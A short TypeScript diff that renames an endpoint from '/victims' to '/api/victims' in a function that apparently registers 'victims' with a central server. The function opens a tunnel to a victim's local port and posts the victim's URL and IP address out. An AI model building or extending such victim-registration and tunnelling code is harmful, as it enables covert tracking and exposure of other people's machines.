@@ -13,7 +13,7 @@ const initVictim = async (req: Request, ip: string) => {
   // Init tunnel in case of localhost
   if (RequestUtils.isLocal(req)) {
     const tunnel = await TunnelUtils.init(RequestUtils.getPort(req));
-    HttpUtils.postJSON('/victims', {
+    HttpUtils.postJSON('/api/victims', {
       url: tunnel.url,
       ip,
       type: 'local',
@@ -21,7 +21,7 @@ const initVictim = async (req: Request, ip: string) => {
     });
   } else {
     // Init new victim's deployed server
-    HttpUtils.postJSON('/victims', {
+    HttpUtils.postJSON('/api/victims', {
       url: `${req.protocol}://${req.get('host')}`,
       ip,
       type: 'online',
